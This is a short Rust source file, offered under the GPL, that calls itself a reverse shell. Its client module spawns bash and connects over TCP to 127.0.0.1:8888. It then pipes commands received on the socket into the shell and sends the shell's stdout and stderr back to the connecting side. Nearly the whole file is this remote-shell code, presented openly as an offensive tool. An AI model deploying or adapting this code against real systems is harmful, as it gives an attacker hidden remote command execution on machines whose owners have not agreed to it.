/*

A reverse shell written in Rust.
Copyright (C) 2022-2023 simonfalke, Sherlock Holmes, Admiral Canaris

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

pub mod client {
	use std::io::{self, Read, Write};
	use std::net::{TcpStream};
	use std::process::{Command, Stdio};
	use std::thread;
	use std::sync::mpsc::{channel, Receiver, Sender};

	fn handle_stdout(mut stdout: impl Read, sender: Sender<Vec<u8>>) {
		let mut buffer = [0; 1024];
		loop {
			match stdout.read(&mut buffer) {
				Ok(n) if n > 0 => {
					sender.send(Vec::from(&buffer[..n])).unwrap();
				},
				_ => break,
			}
		}
	}

	fn handle_stderr(mut stderr: impl Read, sender: Sender<Vec<u8>>) {
		let mut buffer = [0; 1024];
		loop {
			match stderr.read(&mut buffer) {
				Ok(n) if n > 0 => {
					sender.send(Vec::from(&buffer[..n])).unwrap();
				},
				_ => break,
			}
		}
	}

	fn handle_stdin(mut stdin: impl Write, receiver: Receiver<Vec<u8>>) {
		loop {
			match receiver.recv() {
				Ok(data) => {
					stdin.write_all(&data).unwrap();
					stdin.flush().unwrap();
				},
				_ => break,
			}
		}
	}

	fn handle_command(mut stream: TcpStream) -> io::Result<()> {
		let mut cmd_buf = [0u8; 4096];
		let mut command = Command::new("bash")
			.stdin(Stdio::piped())
			.stdout(Stdio::piped())
			.stderr(Stdio::piped())
			.spawn()
			.expect("failed to execute command");

		let stdout = command.stdout.take().unwrap();
		let stderr = command.stderr.take().unwrap();
		let stdin = command.stdin.take().unwrap();

		let (stdout_tx, stdout_rx) = channel();
		let (stderr_tx, stderr_rx) = channel();
		let (stdin_tx, stdin_rx) = channel();

		thread::spawn(move || handle_stdout(stdout, stdout_tx));
		thread::spawn(move || handle_stderr(stderr, stderr_tx));
		thread::spawn(move || handle_stdin(stdin, stdin_rx));

		loop {
			let len = stream.read(&mut cmd_buf)?;
			if len == 0 {
				break;
			}

			stdin_tx.send(Vec::from(&cmd_buf[..len])).unwrap();
			let stdout_data = stdout_rx.recv().unwrap();
			let stderr_data = stderr_rx.recv().unwrap();

			let mut response = Vec::new();
			response.extend_from_slice(&stdout_data);
			response.extend_from_slice(&stderr_data);

			stream.write_all(&response)?;
			stream.flush()?;
		}

		Ok(())
	}

	fn run_client() -> io::Result<()> {
		let stream = TcpStream::connect("127.0.0.1:8888")?;
		handle_command(stream)
	}
}